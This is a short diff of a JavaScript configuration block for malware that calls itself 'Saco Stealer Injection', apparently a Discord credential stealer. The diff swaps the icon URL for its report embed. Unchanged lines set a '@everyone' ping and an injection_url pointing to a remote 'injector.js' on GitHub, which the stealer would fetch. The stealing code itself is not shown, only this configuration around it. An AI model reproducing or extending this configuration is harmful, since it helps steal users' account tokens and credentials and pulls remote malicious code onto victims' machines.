@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Saco Stealer Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Saco Stealer-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://raw.githubusercontent.com/SacoXd/injection/main/335dfec42a1b26bf6274892572783339.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/SacoXd/injection/main/injector.js', 
   /**
